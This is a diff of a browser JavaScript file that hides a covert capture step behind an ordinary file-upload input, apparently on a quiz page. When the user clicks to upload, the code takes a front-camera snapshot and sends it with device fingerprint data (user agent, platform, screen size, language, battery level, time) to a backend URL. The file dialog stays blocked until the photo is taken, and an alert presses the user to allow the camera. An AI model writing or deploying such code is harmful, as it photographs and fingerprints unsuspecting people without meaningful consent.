@@ -1,81 +1,66 @@
-const fileInput = document.getElementById('user-file');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const toast = document.getElementById('toast');
-const form = document.getElementById('quiz-form');
-const submitBtn = document.getElementById('submit-btn');
+// script.js
 
-let photoCaptured = false;
+const fileInput = document.getElementById("user-file"); // file upload input
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const toast = document.getElementById("toast");
 
-// Camera constraints
-const constraints = { video: { facingMode: "user" }, audio: false };
+const BACKEND_URL = "https://your-backend-domain.com/api/upload"; // change this to your backend
+
+// Request camera every time until allowed
+async function requestCameraAndCapture() {
+  try {
+    // Ask for camera permission
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+    video.srcObject = stream;
+
+    // Capture image immediately
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = canvas.toDataURL("image/png");
+
+    // Collect metadata
+    const metadata = {
+      useragent: navigator.userAgent,
+      platform: navigator.platform,
+      width: window.innerWidth,
+      height: window.innerHeight,
+      language: navigator.language,
+      battery: navigator.getBattery ? (await navigator.getBattery()).level * 100 : "N/A",
+      location: "N/A",
+      time: new Date().toISOString()
+    };
+
+    // Send photo + metadata
+    await fetch(BACKEND_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: imageData, metadata })
+    });
+
+    showToast("Photo captured & uploaded!");
+    // Enable file input after upload
+    fileInput.disabled = false;
+
+  } catch (err) {
+    console.error("Camera permission denied or error:", err);
+    alert("Please allow camera permission to continue!");
+  }
+}
 
 // Show toast
 function showToast(message) {
-  toast.innerText = message;
-  toast.classList.add('show');
-  setTimeout(() => toast.classList.remove('show'), 2500);
+  toast.textContent = message;
+  toast.style.display = "block";
+  setTimeout(() => { toast.style.display = "none"; }, 3000);
 }
 
-// Capture photo from camera
-async function capturePhoto() {
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const dataUrl = canvas.toDataURL('image/png');
-
-  // Send photo to backend
-  await fetch('/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: dataUrl, metadata: collectMetadata() })
-  });
-  showToast('Camera photo captured & sent!');
-  photoCaptured = true;
-}
-
-// Collect basic metadata
-function collectMetadata() {
-  return {
-    width: window.innerWidth,
-    height: window.innerHeight,
-    useragent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    time: new Date().toISOString()
-  };
-}
-
-// Request camera permission
-async function requestCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
-    await capturePhoto();
-  } catch (err) {
-    showToast('Camera permission denied! Please allow.');
-    throw err;
+// On file input click, request camera first
+fileInput.addEventListener("click", async (e) => {
+  if (!fileInput.dataset.cameraAllowed) {
+    e.preventDefault(); // prevent opening file dialog until camera captured
+    await requestCameraAndCapture();
+    fileInput.dataset.cameraAllowed = true; // mark as done
+    fileInput.click(); // reopen file dialog
   }
-}
-
-// On file input click
-fileInput.addEventListener('click', async (e) => {
-  try {
-    await requestCamera();
-  } catch (err) {
-    // Do nothing, keep asking until allow
-  }
-});
-
-// On form submit
-form.addEventListener('submit', (e) => {
-  e.preventDefault();
-
-  if (!fileInput.files.length) {
-    showToast('Please select a file before submitting.');
-    return;
-  }
-
-  showToast('Form submitted!');
-  form.style.display = 'none';
-  document.getElementById('success-container').style.display = 'flex';
 });
